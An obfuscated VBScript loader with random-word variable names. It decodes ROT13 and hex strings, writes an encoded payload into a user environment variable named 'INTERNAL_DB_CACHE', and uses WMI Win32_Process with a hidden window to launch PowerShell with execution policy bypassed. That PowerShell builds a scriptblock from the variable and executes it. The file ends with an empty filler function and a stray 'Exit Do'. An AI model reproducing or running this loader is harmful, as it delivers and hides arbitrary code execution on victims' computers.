burghal = ""
circumsail = Split(CStr(ahuehuetl), "áº°áŒ‘á‘¯à£´âƒ“")
For nuclearisation = 0 To UBound(circumsail)
    burghal = burghal & circumsail(nuclearisation)
Next

burghal = Trim(burghal)
glomeris = Chr(38) & Chr(72) 
avaram = ""

For dinginess = 1 To Len(burghal) Step 2
    avaram = avaram & Chr(CInt(glomeris & Mid(burghal, dinginess, 2)))
Next

Dim reuseable, hollo, degust, tibiiform, Luoravetlan, relyric
Dim Filipina, noncovered, liman, hellespontine

reuseable = Array( _
    "VAGREANY_QO_PNPUR", _
    "cbjrefuryy.rkr -RkrphgvbaCbyvpl Olcnff -AbCebsvyr -JvaqbjFglyr Uvqqra -Pbzznaq", _
    "VRK $rai:", _
    ";[Raivebazrag]::FrgRaivebazragInevnoyr" _
)

For relyric = 0 To UBound(reuseable)
    hollo = reuseable(relyric)
    degust = ""
    For Luoravetlan = 1 To Len(hollo)
        tibiiform = Asc(Mid(hollo, Luoravetlan, 1))
        If (tibiiform >= 65 And tibiiform <= 77) Or (tibiiform >= 97 And tibiiform <= 109) Then
            degust = degust & Chr(tibiiform + 13)
        ElseIf (tibiiform >= 78 And tibiiform <= 90) Or (tibiiform >= 110 And tibiiform <= 122) Then
            degust = degust & Chr(tibiiform - 13)
        Else
            degust = degust & Mid(hollo, Luoravetlan, 1)
        End If
    Next
    reuseable(relyric) = degust
Next

Filipina    = reuseable(0)
noncovered     = reuseable(1)
liman     = reuseable(2)
hellespontine     = reuseable(3)

Dim infare, undersitter, leatherwork, prayerlike, agrobacteriumS, agrobacteriumSt, agrobacteriumP, Faneuil

Set infare = CreateObject("WScript.Shell")
Set undersitter = infare.Environment("User")
undersitter(Filipina) = avaram

leatherwork = Chr(38) & " ([ScKAripKAtBKAloKAck]::CKArKAeate(${env:" & Filipina & "}))"
leatherwork = Replace(leatherwork, "KA", "")
prayerlike = noncovered & " """ & leatherwork & """"

Faneuil = Array("77696e6d676d74733a726f6f745c63696d7632", "57696e33325f50726f6365737353746172747570", "57696e33325f50726f63657373")

For relyric = 0 To UBound(Faneuil)
    burghal = Faneuil(relyric)
    degust = ""
    For dinginess = 1 To Len(burghal) Step 2
        degust = degust & Chr(CInt(glomeris & Mid(burghal, dinginess, 2)))
    Next
    Faneuil(relyric) = degust
Next

agrobacteriumS  = Faneuil(0)
agrobacteriumSt = Faneuil(1)
agrobacteriumP  = Faneuil(2)

Dim trachycarpus, nonvirtuous, ruticilla, hairy

Set trachycarpus = GetObject(agrobacteriumS)
Set nonvirtuous = trachycarpus.Get(agrobacteriumSt).SpawnInstance_

nonvirtuous.ShowWindow = 0 

ruticilla = trachycarpus.Get(agrobacteriumP).Create(prayerlike, Null, nonvirtuous, hairy)

Set undersitter = Nothing
Set infare = Nothing
Set trachycarpus = Nothing
Set nonvirtuous = Nothing

Function alebench(ByVal jiggered, ByVal paregmenons, ByVal labellum)
End Function

  Exit Do
